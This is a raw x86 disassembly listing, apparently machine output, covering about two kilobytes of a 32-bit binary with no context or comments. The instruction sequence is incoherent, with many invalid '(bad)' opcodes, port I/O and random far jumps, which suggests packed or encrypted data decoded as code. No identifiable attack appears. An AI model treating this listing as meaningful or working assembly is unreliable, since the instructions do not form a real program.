  41d426:	outs   dx,DWORD PTR ds:[esi]
  41d427:	ror    BYTE PTR fs:[esp+edi*1+0x75ebff23],cl
  41d42f:	pop    edx
  41d430:	and    ecx,ebp
  41d432:	enter  0xd133,0xcd
  41d436:	xor    BYTE PTR ss:[esi+0x3c8cd233],al
  41d43d:	scas   eax,DWORD PTR es:[edi]
  41d43e:	aas    
  41d43f:	push   ds
  41d440:	cmp    BYTE PTR [ebx+eiz*1],0xcd
  41d444:	enter  0xf89,0xfc
  41d448:	ins    DWORD PTR es:[edi],dx
  41d449:	jae    0x41d489
  41d44b:	xor    al,0xd2
  41d44d:	mov    ebx,ss
  41d44f:	loop   0x41d4ad
  41d451:	mov    edi,0x63f3d155
  41d456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d457:	jns    0x41d44c
  41d459:	cmp    BYTE PTR [eax-0x1],al
  41d45c:	and    BYTE PTR [ebp-0x3232c187],dh
  41d462:	pushf  
  41d463:	mov    bl,0x0
  41d465:	sub    edi,DWORD PTR [ecx]
  41d467:	or     bl,BYTE PTR [ecx-0x5830c873]
  41d46d:	mov    ecx,0x3b0f0099
  41d472:	adc    al,0x7d
  41d474:	push   0x67
  41d476:	add    bl,dh
  41d478:	out    0xe6,al
  41d47a:	stc    
  41d47b:	xor    al,0xfb
  41d47d:	mul    BYTE PTR [ecx+0x51]
  41d480:	inc    ebp
  41d481:	add    bh,dl
  41d483:	rcr    esp,cl
  41d485:	cmp    al,0x9f
  41d487:	aad    0xd8
  41d489:	inc    ebp
  41d48a:	jne    0x41d4b7
  41d48c:	add    BYTE PTR [ebx-0x64646857],bh
  41d492:	out    0xa2,eax
  41d494:	sub    DWORD PTR [ebx],esp
  41d496:	adc    DWORD PTR [eax],eax
  41d498:	lahf   
  41d499:	call   0xde5bb9e
  41d49e:	push   ebp
  41d49f:	mov    ebx,0xc5263db0
  41d4a4:	aas    
  41d4a5:	push   ss
  41d4a6:	inc    DWORD PTR cs:[ecx+0x46]
  41d4aa:	loope  0x41d502
  41d4ac:	mov    ebx,0xadf7d6d4
  41d4b1:	mov    al,ds:0x7ee58ccb
  41d4b6:	les    eax,FWORD PTR [esi+0x63]
  41d4b9:	loope  0x41d451
  41d4bb:	sbb    BYTE PTR [ebp+0x5aa54844],al
  41d4c1:	(bad)  
  41d4c2:	out    0xd3,eax
  41d4c4:	fdivr  QWORD PTR [edi+0xe]
  41d4c7:	add    BYTE PTR [ebp+0x64],dl
  41d4ca:	xchg   ecx,eax
  41d4cb:	(bad)  
  41d4cc:	loopne 0x41d53d
  41d4ce:	imul   edx,DWORD PTR [edi],0xffffffb6
  41d4d1:	ret    0x402
  41d4d4:	mov    es,WORD PTR [ebx-0x24e1cbce]
  41d4da:	mov    dh,0x8
  41d4dc:	ins    BYTE PTR es:[edi],dx
  41d4dd:	pop    ds
  41d4de:	mov    bh,0x76
  41d4e0:	pop    esp
  41d4e1:	push   ecx
  41d4e2:	adc    al,0xe3
  41d4e4:	clc    
  41d4e5:	lahf   
  41d4e6:	call   DWORD PTR [ebx-0x41279fbc]
  41d4ec:	outs   dx,BYTE PTR ds:[esi]
  41d4ed:	ins    BYTE PTR es:[edi],dx
  41d4ee:	fcom   st(4)
  41d4f0:	stc    
  41d4f1:	aad    0x8b
  41d4f3:	jg     0x41d484
  41d4f5:	adc    al,0xbc
  41d4f7:	lea    esp,[ebp-0x68d7a3f8]
  41d4fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4fe:	aas    
  41d4ff:	adc    al,0x4b
  41d501:	xchg   DWORD PTR [edi+0x52c2d1ad],esi
  41d507:	xchg   ecx,eax
  41d508:	mov    eax,0x97713a98
  41d50d:	out    dx,eax
  41d50e:	(bad)  
  41d50f:	sub    DWORD PTR [eax],ebp
  41d511:	dec    eax
  41d513:	inc    esi
  41d514:	jg     0x41d557
  41d516:	loopne 0x41d518
  41d518:	mov    ecx,0xe8ca00f1
  41d51d:	(bad)  
  41d51e:	sub    al,0x75
  41d520:	pop    ebx
  41d521:	popf   
  41d522:	mov    bh,0x41
  41d524:	scas   al,BYTE PTR es:[edi]
  41d525:	dec    ecx
  41d526:	aas    
  41d527:	push   ds
  41d528:	add    BYTE PTR [eax],0xd9
  41d52b:	retf   
  41d52c:	add    dh,BYTE PTR [edi-0x55ff6e0e]
  41d532:	mov    BYTE PTR [ebp-0x73605a29],ch
  41d538:	jmp    0xb5bec79
  41d53d:	or     ch,ah
  41d53f:	inc    ebp
  41d540:	jg     0x41d517
  41d542:	cvtpi2ps xmm0,mm0
  41d545:	rcl    bl,cl
  41d547:	sub    eax,0xe8bf7e40
  41d54c:	fistp  WORD PTR ds:0xb651b405
  41d552:	mov    bl,0x3f
  41d554:	mov    dl,0x5f
  41d556:	fs shrd eax,ecx,cl
  41d55a:	adc    ch,ch
  41d55c:	mov    dh,0xbf
  41d55e:	in     eax,0x62
  41d560:	stos   BYTE PTR es:[edi],al
  41d561:	sub    al,0xc5
  41d563:	jg     0x41d522
  41d565:	and    DWORD PTR [esi-0x1a],ebp
  41d568:	in     eax,0xea
  41d56a:	mov    cl,0x39
  41d56c:	add    BYTE PTR ds:0x9c1935e3,bh
  41d572:	stc    
  41d573:	ins    DWORD PTR es:[edi],dx
  41d574:	add    DWORD PTR [esi-0x6d],0x1acb5fe1
  41d57b:	rol    DWORD PTR [eax],1
  41d57d:	pop    ebx
  41d57e:	ret    0x8360
  41d581:	add    eax,0x80a37f57
  41d586:	push   eax
  41d587:	test   ch,ah
  41d589:	or     ebx,esp
  41d58b:	fdivr  st,st(3)
  41d58d:	cwde   
  41d58e:	sbb    BYTE PTR [eax+edi*2+0x3e0029ff],bl
  41d595:	or     eax,0x915b0b8d
  41d59a:	loop   0x41d600
  41d59c:	test   DWORD PTR [edi-0x12],esp
  41d59f:	les    edi,FWORD PTR [edi]
  41d5a1:	cwde   
  41d5a2:	xchg   edi,eax
  41d5a3:	cs ins DWORD PTR es:[edi],dx
  41d5a5:	clc    
  41d5a6:	xchg   ebx,eax
  41d5a7:	out    dx,eax
  41d5a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5a9:	sub    edi,DWORD PTR [edi-0x7e26ff7c]
  41d5af:	sbb    edx,DWORD PTR [esi+ebp*1]
  41d5b2:	addr16 mov ds:0xdb0,al
  41d5b6:	retf   
  41d5b7:	xor    ax,0x87ff
  41d5bb:	pop    ebx
  41d5bc:	lods   eax,DWORD PTR ds:[esi]
  41d5bd:	jns    0x41d5dd
  41d5bf:	add    ah,al
  41d5c1:	xchg   esp,eax
  41d5c2:	into   
  41d5c3:	or     eax,0x634f41f2
  41d5c8:	sti    
  41d5c9:	outs   dx,BYTE PTR ds:[esi]
  41d5ca:	dec    ebp
  41d5cb:	mov    edi,0x99d1bfa9
  41d5d0:	and    ebx,DWORD PTR [ebp+0x2e0fefd1]
  41d5d6:	aaa    
  41d5d7:	outs   dx,DWORD PTR ds:[esi]
  41d5d8:	jno    0x41d5b8
  41d5da:	popa   
  41d5db:	call   DWORD PTR [edi+0x0]
  41d5de:	mov    DWORD PTR [eax-0x5230900],ebp
  41d5e4:	fcmovne st,st(0)
  41d5e6:	bnd ja 0x41d5a8
  41d5e9:	mov    eax,0x198a0700
  41d5ee:	mov    ecx,0xf0b6ed86
  41d5f3:	add    DWORD PTR [edi],edi
  41d5f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5f6:	mov    ebx,0x30aeef2e
  41d5fb:	xlat   BYTE PTR ds:[ebx]
  41d5fc:	adc    BYTE PTR [ebp+0x64],ch
  41d5ff:	cmp    DWORD PTR [ecx-0x37efa8c1],0xae6d2ed8
  41d609:	ret    
  41d60a:	mov    edi,0x6ebc47ad
  41d60f:	ds cmp edx,ebp
  41d612:	cmp    BYTE PTR [edi-0x1c04865],dl
  41d618:	add    BYTE PTR [esp+esi*1],ah
  41d61b:	add    BYTE PTR [ebx+0x4d],ch
  41d61e:	xchg   edi,eax
  41d61f:	dec    eax
  41d620:	jbe    0x41d5e3
  41d622:	and    eax,0x7fc4a3bf
  41d627:	lods   eax,DWORD PTR ds:[esi]
  41d628:	jg     0x41d669
  41d62a:	mov    dl,0x55
  41d62c:	loope  0x41d656
  41d62e:	sbb    al,0xbf
  41d630:	pop    ds
  41d631:	jbe    0x41d658
  41d633:	add    BYTE PTR [edi+0x2e],ch
  41d636:	mov    dh,0x6d
  41d638:	mov    ch,0xcb
  41d63a:	add    BYTE PTR [esi+0x67],bh
  41d63d:	sub    al,0xbf
  41d63f:	jg     0x41d62e
  41d641:	ret    0xfe7b
  41d644:	xchg   esi,eax
  41d645:	(bad)  
  41d646:	mov    ecx,0xb4bfcfd0
  41d64b:	xor    eax,0x17005d1e
  41d650:	push   esi
  41d651:	add    BYTE PTR [esi],al
  41d653:	setb   BYTE PTR [edi+0xe0f37e5]
  41d65a:	pop    ds
  41d65b:	add    BYTE PTR [ebp-0x77c0bf93],dh
  41d661:	pusha  
  41d662:	fld    TBYTE PTR [esi]
  41d664:	fs jle 0x41d61b
  41d667:	push   esi
  41d668:	xchg   ecx,eax
  41d669:	jp     0x41d652
  41d66b:	arpl   WORD PTR [edi+0x5c],ax
  41d66e:	jp     0x41d6af
  41d670:	into   
  41d671:	outs   dx,BYTE PTR ds:[esi]
  41d672:	mov    al,ds:0xc2fbf4e
  41d677:	push   DWORD PTR [edi+0x4df6adc2]
  41d67d:	mov    bh,0x6b
  41d67f:	mov    dl,0xea
  41d681:	push   esp
  41d682:	and    al,BYTE PTR [ecx-0x3e]
  41d685:	les    esp,FWORD PTR [ebx+0x3f02f979]
  41d68b:	sbb    eax,0xf2c16600
  41d690:	add    BYTE PTR [eax],ch
  41d692:	or     bh,bh
  41d694:	js     0x41d6c4
  41d696:	ins    DWORD PTR es:[edi],dx
  41d697:	ins    DWORD PTR es:[edi],dx
  41d698:	or     eax,ecx
  41d69a:	jecxz  0x41d70b
  41d69c:	mov    edi,0xfbe9244
  41d6a1:	fcomp  QWORD PTR [edx-0x28]
  41d6a4:	scas   al,BYTE PTR es:[edi]
  41d6a5:	repz dec ecx
  41d6a7:	test   BYTE PTR [ebp-0x2c0a381],0x9a
  41d6ae:	xchg   edi,eax
  41d6af:	outs   dx,BYTE PTR ds:[esi]
  41d6b0:	or     ebp,eax
  41d6b2:	xabort 0x5a
  41d6b5:	pop    es
  41d6b6:	mov    edi,0xc8ed00a4
  41d6bb:	and    cl,BYTE PTR ds:0x33d6140b
  41d6c1:	mov    dh,0x7f
  41d6c3:	nop
  41d6c4:	ret    
  41d6c5:	adc    DWORD PTR [edi],esi
  41d6c7:	xchg   esi,eax
  41d6c8:	adc    cl,0x4b
  41d6cb:	xchg   esi,eax
  41d6cc:	aas    
  41d6cd:	retf   
  41d6ce:	push   DWORD PTR [edi]
  41d6d0:	fcmovb st,st(2)
  41d6d2:	lods   eax,DWORD PTR ds:[esi]
  41d6d3:	rcr    DWORD PTR [edi+0x3a],0xcc
  41d6d7:	sbb    edi,eax
  41d6d9:	lds    esp,FWORD PTR [ebp-0x37252fb2]
  41d6df:	push   edx
  41d6e0:	sbb    ebp,DWORD PTR [edi+0x59]
  41d6e3:	aas    
  41d6e4:	jge    0x41d696
  41d6e6:	cmp    BYTE PTR [ebx+0x60],bl
  41d6e9:	stc    
  41d6ea:	aaa    
  41d6eb:	setp   BYTE PTR [eax+0x3b9500]
  41d6f2:	out    0xaa,eax
  41d6f4:	stc    
  41d6f5:	jb     0x41d735
  41d6f7:	or     esi,DWORD PTR [edx+ebx*2]
  41d6fa:	popa   
  41d6fb:	jp     0x41d758
  41d6fd:	shr    DWORD PTR [eax+0x37cfa63f],0xb6
  41d704:	and    eax,DWORD PTR ds:0xff7e9b10
  41d70a:	out    0x0,eax
  41d70c:	iret   
  41d70d:	les    edx,FWORD PTR [edx-0x53]
  41d710:	mov    dh,0x75
  41d712:	ins    DWORD PTR es:[edi],dx
  41d713:	cmc    
  41d714:	sub    eax,0xc041a7bb
  41d719:	dec    edx
  41d71a:	or     dh,BYTE PTR [ecx+0x36b6dc6d]
  41d720:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d721:	popa   
  41d722:	bound  ecx,QWORD PTR ds:0x8f297542
  41d728:	dec    eax
  41d729:	mov    ds:0xaead85c2,eax
  41d72e:	jno    0x41d768
  41d730:	retf   0xbc1b
  41d733:	call   0xda6d:0xdadda19d
  41d73a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d73b:	lods   eax,DWORD PTR ds:[esi]
  41d73c:	jl     0x41d764
  41d73e:	sahf   
  41d73f:	push   cs
  41d740:	xor    esp,ebx
  41d742:	inc    eax
  41d743:	mov    dh,0x8d
  41d745:	mov    dl,0x74
  41d747:	out    dx,al
  41d748:	add    edx,DWORD PTR [edx+0xb4a69c7]
  41d74e:	push   ss
  41d74f:	adc    edx,DWORD PTR [eax]
  41d751:	(bad)  
  41d753:	sti    
  41d754:	add    ah,BYTE PTR [edi]
  41d756:	push   es
  41d757:	cwde   
  41d758:	std    
  41d759:	outs   dx,BYTE PTR ds:[esi]
  41d75a:	xor    al,0xb6
  41d75c:	pop    ebx
  41d75d:	stc    
  41d75e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d75f:	sub    eax,0x1b4cce3e
  41d764:	outs   dx,DWORD PTR ds:[esi]
  41d765:	push   ds
  41d766:	mov    al,ds:0xd5112da
  41d76b:	mov    edi,0x5baddd42
  41d770:	fadd   st,st(6)
  41d772:	fsub   DWORD PTR [ebp+0x6c]
  41d775:	aas    
  41d776:	fisttp QWORD PTR [edi+0x8d66196]
  41d77c:	push   0xf616db7
  41d781:	ror    BYTE PTR [edi+0x67a56b0],1
  41d787:	adc    DWORD PTR [esp+edi*2+0x69],ebx
  41d78b:	pop    ebx
  41d78c:	fdiv   DWORD PTR [ebp-0x6]
  41d78f:	sbb    DWORD PTR [esi+0x5],esi
  41d792:	pop    esi
  41d793:	and    ebx,DWORD PTR [edi-0x1c]
  41d796:	add    BYTE PTR [ebx],bl
  41d798:	ins    DWORD PTR es:[edi],dx
  41d799:	mov    ebx,0xe86ab0b0
  41d79e:	fs retf 0xf18e
  41d7a2:	lods   eax,DWORD PTR ds:[esi]
  41d7a3:	(bad)  
  41d7a4:	push   eax
  41d7a5:	ins    DWORD PTR es:[edi],dx
  41d7a6:	sub    al,0x6d
  41d7a8:	ins    BYTE PTR es:[edi],dx
  41d7a9:	jecxz  0x41d7ac
  41d7ab:	cdq    
  41d7ac:	cmp    al,0xc7
  41d7af:	outs   dx,DWORD PTR ds:[esi]
  41d7b0:	add    esi,DWORD PTR [ebp+0x1db6db5b]
  41d7b6:	cmp    eax,0x6808c42f
  41d7bb:	or     bl,BYTE PTR [edi+ebp*8+0x56]
  41d7bf:	mov    dh,0xdb
  41d7c1:	inc    esi
  41d7c2:	mov    ebx,0xd7aa49c8
  41d7c7:	pop    ebp
  41d7c8:	fild   QWORD PTR [ebp+0x248c2624]
  41d7ce:	loopne 0x41d816
  41d7d0:	mov    ebx,0x8b6635d1
  41d7d5:	cmc    
  41d7d6:	jno    0x41d84d
  41d7d8:	sub    al,0xbb
  41d7da:	lea    ebp,[ebp-0x1c]
  41d7dd:	(bad)  
  41d7de:	mov    edi,0x260085db
  41d7e3:	mov    bh,0x0
  41d7e5:	sub    eax,0x30bf5328
  41d7ea:	mov    ah,0xdd
  41d7ec:	push   ss
  41d7ed:	mov    dh,0xe4
  41d7ef:	xor    eax,0x2f63caa3
  41d7f4:	push   ds
  41d7f5:	inc    ebx
  41d7f6:	(bad)  
  41d7f7:	std    
  41d7f8:	push   0xffffffa3
  41d7fa:	xor    eax,0x707f6f
  41d7ff:	add    eax,0xc1ff3bb3
  41d804:	mov    bh,0xad
  41d806:	sbb    eax,0x12f03f59
  41d80b:	xchg   esp,eax
  41d80c:	jmp    0x1e67f128
  41d811:	sub    eax,0x42ce13b6
  41d816:	mov    edi,0x53ae7f58
  41d81b:	sbb    ebp,0x71d81646
  41d821:	add    edi,edi
  41d823:	ret    0xd732
  41d826:	inc    ebp
  41d827:	jnp    0x41d81c
  41d829:	push   es
  41d82a:	and    ecx,DWORD PTR [ebx+0x3f]
  41d82d:	sub    ah,bl
  41d82f:	mov    edi,0xc6a100dc
  41d834:	inc    edx
  41d835:	cmp    al,0x7f
  41d837:	nop
  41d838:	add    BYTE PTR [eax+0x17],ah
  41d83b:	add    bh,ch
  41d83d:	in     al,0x8d
  41d83f:	add    ecx,DWORD PTR [ebp-0x1c]
  41d842:	fdivr  QWORD PTR [esp+ebx*1-0x701bc057]
  41d849:	or     BYTE PTR [eax],al
  41d84b:	jne    0x41d8c3
  41d84d:	add    BYTE PTR [ebx],bl
  41d84f:	imul   edi,DWORD PTR [ebx-0x2a934dcb],0xffffffbb
  41d856:	sbb    al,0xa5
  41d858:	push   cs
  41d859:	and    BYTE PTR [edi-0x26],bh
  41d85c:	mov    edx,0xb17c10b1
  41d861:	(bad)  [esi+0x42b71c46]
  41d867:	in     eax,dx
  41d868:	push   ss
  41d869:	pop    ecx
  41d86a:	mov    edi,0x488a3260
  41d86f:	mov    edi,0xc1b236c2
  41d874:	(bad)  
  41d875:	rcl    BYTE PTR [ecx+0x5d],cl
  41d878:	mov    edi,0xeb0b69fa
  41d87d:	mov    cl,BYTE PTR [ebx]
  41d87f:	in     eax,dx
  41d880:	test   al,0xed
  41d882:	xor    eax,0xff36f3c4
  41d887:	jge    0x41d82a
  41d889:	fimul  DWORD PTR [edx]
  41d88b:	ins    DWORD PTR es:[edi],dx
  41d88c:	imul   ecx,DWORD PTR [edx],0xffffffac
  41d88f:	dec    eax
  41d890:	mov    al,0x50
  41d892:	clc    
  41d893:	test   al,0x76
  41d895:	popa   
  41d896:	fistp  DWORD PTR [esi+0x4326f13f]
  41d89c:	sbb    DWORD PTR [ebp+0x1a14ea5e],0xffffffb6
  41d8a3:	fcmovbe st,st(2)
  41d8a5:	lea    ecx,[edx+eiz*2]
  41d8a8:	jmp    0xfdde:0x52984e0b
  41d8af:	xchg   esi,eax
  41d8b0:	dec    edi
  41d8b1:	fdiv   QWORD PTR [esi-0x3a800f49]
  41d8b7:	aaa    
  41d8b8:	test   BYTE PTR [edi-0x48e55147],bh
  41d8be:	fidiv  DWORD PTR [esi-0x756a0b44]
  41d8c4:	pop    esp
  41d8c5:	fdivr  QWORD PTR [edx-0x26]
  41d8c8:	jnp    0x41d8ff
  41d8ca:	ds mov bh,0xda
  41d8cd:	mov    edi,0x1b26bfd5
  41d8d2:	loope  0x41d880
  41d8d4:	sbb    BYTE PTR [esi],bh
  41d8d6:	ins    DWORD PTR es:[edi],dx
  41d8d7:	pop    ds
  41d8d8:	mov    eax,0xf90427da
  41d8dd:	js     0x41d954
  41d8df:	add    eax,0x8379bf40
  41d8e4:	fist   WORD PTR [esi+0x4c64d8be]
  41d8ea:	aas    
  41d8eb:	ins    DWORD PTR es:[edi],dx
  41d8ec:	ret    0x98ae
  41d8ef:	fistp  WORD PTR [eax+eax*1]
  41d8f2:	sahf   
  41d8f3:	and    eax,0x2fb56d2e
  41d8f8:	and    eax,DWORD PTR [edx-0x5e55945c]
  41d8fe:	jg     0x41d90c
  41d900:	xor    al,0x6e
  41d902:	out    0x48,al
  41d904:	add    BYTE PTR [edi+0x23],cl
  41d907:	stc    
  41d908:	cmp    al,0xdb
  41d90a:	push   DWORD PTR [esi+0x2db6362]
  41d910:	ficom  WORD PTR [ecx]
  41d912:	sbb    DWORD PTR [eax],0x74a2ff35
  41d918:	jmp    0x41d8d3
  41d91a:	xchg   ebp,eax
  41d91b:	lods   eax,DWORD PTR ds:[esi]
  41d91c:	mov    edi,0xb5a6a1a2
  41d921:	out    0x68,al
  41d923:	pop    ebp
  41d924:	sbb    cl,bl
  41d926:	stos   BYTE PTR es:[edi],al
  41d927:	mov    DWORD PTR [edi-0x40ef5929],edi
  41d92d:	xor    BYTE PTR [edi],0x36
  41d930:	fidiv  DWORD PTR [esi+0xd7a7f4d]
  41d936:	mov    dh,0x48
  41d938:	xchg   DWORD PTR [esi-0x4e],edi
  41d93b:	ins    DWORD PTR es:[edi],dx
  41d93c:	fcmovne st,st(2)
  41d93e:	fild   WORD PTR [eax]
  41d940:	jg     0x41d988
  41d942:	adc    eax,0xe49f00
  41d947:	jecxz  0x41d8ea
  41d949:	dec    esp
  41d94a:	xlat   BYTE PTR ds:[ebx]
  41d94b:	fcomp  st(0)
  41d94d:	mov    dh,0x6d
  41d94f:	inc    eax
  41d950:	pop    DWORD PTR [esp+ebp*8+0x58]
  41d954:	add    bl,BYTE PTR [ebx+ebx*8+0x50]
  41d958:	lea    ebx,[edi-0x24]
  41d95b:	fmul   DWORD PTR [ebp+0x3fe50cb3]
  41d961:	call   FWORD PTR [edx]
  41d963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d964:	mov    ah,0x69
  41d966:	fs stc 
  41d968:	adc    bh,BYTE PTR [edi+0x7]
  41d96b:	xor    BYTE PTR [eax],al
  41d96d:	fistp  DWORD PTR [ebx-0x525a46ce]
  41d973:	mov    al,0x71
  41d975:	and    edi,DWORD PTR [edx+0x18]
  41d978:	adc    eax,DWORD PTR [ebx+0x65]
  41d97b:	and    bh,BYTE PTR [edi-0x35272447]
  41d981:	mov    eax,ds:0x6f5a771
  41d986:	ret    0xf7bf
  41d989:	add    BYTE PTR [ecx],al
  41d98b:	lods   eax,DWORD PTR ds:[esi]
  41d98c:	enter  0x6da5,0xba
  41d990:	cwde   
  41d991:	sbb    DWORD PTR [edi-0xf801ad6],edi
  41d997:	or     esi,DWORD PTR [esi-0x463b0826]
  41d99d:	scas   eax,DWORD PTR es:[edi]
  41d99e:	sbb    BYTE PTR [edi-0x1e],bh
  41d9a1:	mov    edi,0xada5da37
  41d9a6:	push   ebp
  41d9a7:	push   cs
  41d9a8:	jmp    0xaccc:0x89c96986
  41d9af:	or     cl,bl
  41d9b1:	test   al,0x61
  41d9b3:	imul   esi,DWORD PTR [ebx-0x208001d1],0x7f
  41d9ba:	sbb    BYTE PTR [edi+0x37],bl
  41d9bd:	inc    ebx
  41d9be:	sbb    ebp,ebx
  41d9c0:	adc    DWORD PTR [ebx+0x7f2c6f38],esp
  41d9c6:	or     eax,0xb5b6db01
  41d9cb:	dec    DWORD PTR [ebx]
  41d9cd:	and    BYTE PTR [edx-0xd84aa],ch
  41d9d3:	adc    BYTE PTR [edi-0x27c04926],dl
  41d9d9:	push   0x97f52cd9
  41d9de:	push   es
  41d9df:	fdiv   DWORD PTR [esi-0x5e001693]
  41d9e5:	xchg   ebp,eax
  41d9e6:	fidivr WORD PTR gs:[edi+0x6da3ddd9]
  41d9ed:	sub    DWORD PTR [edx+0x3dfa7f5c],esi
  41d9f3:	mov    BYTE PTR [edi+0x8c0bfb5],cl
  41d9f9:	mov    ah,0xcf
  41d9fb:	add    bh,BYTE PTR [ebx]
  41d9fd:	ror    DWORD PTR [edx+eax*8+0x3db6a6ff],0x74
  41da05:	leave  
  41da06:	aas    
  41da07:	lds    ebx,FWORD PTR [esi]
  41da09:	pop    ds
  41da0a:	mov    edi,0xe35eefed
  41da0f:	imul   edi,DWORD PTR [ebx],0x7fe5c4b2
  41da15:	into   
  41da16:	sub    al,BYTE PTR [ebx]
  41da18:	mov    eax,ds:0xc6a5bfd4
  41da1d:	jbe    0x41da03
  41da1f:	mov    BYTE PTR [ecx-0x6ced5859],0x2
  41da26:	lea    esi,[esi+0x246c8dc6]
  41da2c:	iret   
  41da2d:	data16 sub WORD PTR ds:0x6cad847f,0xff9c
  41da36:	out    dx,al
  41da37:	xor    BYTE PTR [ebp+eiz*2+0x42],dh
  41da3b:	jg     0x41da18
  41da3d:	lods   eax,DWORD PTR ds:[esi]
  41da3e:	mov    dh,0x70
  41da40:	dec    ecx
  41da41:	xchg   edi,eax
  41da42:	push   ss
  41da43:	stos   BYTE PTR es:[edi],al
  41da44:	outs   dx,BYTE PTR ds:[esi]
  41da45:	jg     0x41da21
  41da47:	ret    0x9659
  41da4a:	fidiv  DWORD PTR [esi+0xde20b6d]
  41da50:	inc    edi
  41da51:	ror    DWORD PTR [ebx],1
  41da53:	bound  edi,QWORD PTR [ecx-0x3d34fa0f]
  41da59:	jbe    0x41d9ff
  41da5b:	aas    
  41da5c:	mov    esp,0xbb64cbfb
  41da61:	repz push 0x6d2b70ab
  41da67:	push   esi
  41da68:	int    0xad
  41da6a:	imul   edx,DWORD PTR [edx],0xffffff99
  41da6d:	popa   
  41da6e:	jg     0x41d9fd
  41da70:	ins    DWORD PTR es:[edi],dx
  41da71:	and    DWORD PTR [edx-0x65],esi
  41da74:	rol    BYTE PTR [eax+0x48],1
  41da77:	xchg   BYTE PTR ds:0x8dc07630,bl
  41da7d:	shr    BYTE PTR [esi],cl
  41da7f:	test   BYTE PTR [ebx],0x63
  41da82:	xchg   esi,eax
  41da83:	push   ecx
  41da84:	jmp    DWORD PTR [edx+0x4b]
  41da87:	sub    al,0x6d
  41da89:	sub    eax,0x79a33894
  41da8e:	ror    BYTE PTR [ebx+0x26],1
  41da91:	test   DWORD PTR [esp+ebx*8],edi
  41da94:	sahf   
  41da95:	or     edi,DWORD PTR [edi]
  41da97:	jmp    0x7fd4:0x532f4934
  41da9e:	fstp   TBYTE PTR [edi+0x6f9cb3c0]
  41daa4:	adc    al,0xb9
  41daa6:	div    BYTE PTR [edi]
  41daa8:	and    al,0x0
  41daaa:	sti    
  41daab:	jge    0x41da7a
  41daad:	fdivr  QWORD PTR [esp+ebp*1+0x0]
  41dab1:	call   edx
  41dab3:	enter  0x7700,0x9b
  41dab7:	(bad)  
  41dab8:	add    DWORD PTR [edi],esi
  41daba:	mov    dh,0x6d
  41dabc:	cmp    eax,DWORD PTR [esi+0x42]
  41dabf:	pop    ds
  41dac0:	and    bh,bh
  41dac2:	pop    ebp
  41dac3:	mov    bl,0x3a
  41dac5:	mov    dl,0xd4
  41dac7:	ret    0x4ccc
  41daca:	and    edi,edi
  41dacc:	out    dx,al
  41dacd:	xor    eax,0xd1b23bf8
  41dad2:	push   esi
  41dad3:	cmc    
  41dad4:	bound  esi,QWORD PTR ds:0x8c49927f
  41dada:	cmc    
  41dadb:	aaa    
  41dadc:	push   ds
  41dadd:	outs   dx,BYTE PTR ds:[esi]
  41dade:	pop    ebx
  41dadf:	ds pop ecx
  41dae1:	mov    ecx,0x8e7fa56a
  41dae6:	aas    
  41dae7:	mov    bh,0xb0
  41dae9:	shl    dh,0xb0
  41daec:	ins    DWORD PTR es:[edi],dx
  41daed:	ds in  eax,dx
  41daef:	mov    bl,0x93
  41daf1:	jg     0x41db6c
  41daf3:	add    dl,0xb1
  41daf6:	aad    0x18
  41daf8:	mov    ecx,0x873c6f3f
  41dafd:	and    DWORD PTR [ebp-0x7d],ebp
  41db00:	jge    0x41db70
  41db02:	xor    DWORD PTR [edx+0x3f9b523f],esi
  41db08:	push   0x62
  41db0a:	jb     0x41db3b
  41db0c:	(bad)  
  41db0d:	mov    dh,0x70
  41db0f:	test   eax,0x537a32b3
  41db14:	popf   
  41db15:	cmp    DWORD PTR [ebp+0x78],edi
  41db18:	stc    
  41db19:	xchg   ecx,eax
  41db1a:	in     eax,0x73
  41db1c:	mov    edi,edi
  41db1e:	xchg   esi,eax
  41db1f:	inc    eax
  41db20:	adc    cl,BYTE PTR [edi+0x8]
  41db23:	add    DWORD PTR [esi],ebp
  41db25:	sub    eax,0x5be080b4
  41db2a:	call   0x76c2:0x7fbfdf89
  41db31:	stc    
  41db32:	(bad)  
  41db33:	arpl   bp,bp
  41db35:	lods   eax,DWORD PTR ds:[esi]
  41db36:	add    BYTE PTR [esi-0x4e43d86f],dl
  41db3c:	dec    ecx
  41db3d:	in     eax,dx
  41db3e:	sub    esi,DWORD PTR [esi+0x5fff50a5]
  41db44:	cmp    edi,0x79
  41db47:	jecxz  0x41db19
  41db49:	cmp    ch,BYTE PTR [eax-0x49]
  41db4c:	inc    edx
  41db4d:	sub    DWORD PTR [ebx],ecx
  41db4f:	retf   0xbf71
  41db52:	dec    eax
  41db53:	sub    BYTE PTR ds:0xafbb5b6d,0x62
  41db5a:	jo     0x41db1b
  41db5c:	sub    BYTE PTR [edi],0x71
  41db5f:	or     dh,BYTE PTR [esi-0x44a49352]
  41db65:	mov    ah,0xbf
  41db67:	out    0x86,eax
  41db69:	jmp    0x5bf84fd4
  41db6e:	jge    0x41db71
  41db70:	dec    edx
  41db71:	mov    cl,0xb0
  41db73:	ins    DWORD PTR es:[edi],dx
  41db74:	inc    edx
  41db75:	xchg   BYTE PTR [ebx],ah
  41db77:	sahf   
  41db78:	test   eax,0xb183ace
  41db7d:	paddusb mm7,QWORD PTR [ebx]
  41db80:	loopne 0x41dbd7
  41db82:	aas    
  41db83:	fbstp  TBYTE PTR [edx+0x6db8ffe2]
  41db89:	fild   DWORD PTR [ecx-0x40dc4c1]
  41db8f:	not    BYTE PTR [edx-0x4a458306]
  41db95:	adc    eax,ebx
  41db97:	arpl   WORD PTR [eax-0x10b877c1],ax
  41db9d:	push   cs
  41db9e:	nop
  41db9f:	rol    BYTE PTR [ebx],cl
  41dba1:	mov    cl,0xf8
  41dba3:	jg     0x41dbbb
  41dba5:	aas    
  41dba6:	aas    
  41dba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dba8:	xchg   edx,eax
  41dba9:	arpl   WORD PTR [esi+edx*4],ax
  41dbac:	(bad)  
  41dbad:	jmp    FWORD PTR [edx]
  41dbaf:	cs aas 
  41dbb1:	call   DWORD PTR ss:[edi]
  41dbb4:	fisub  DWORD PTR ss:[ebp+0x3a]
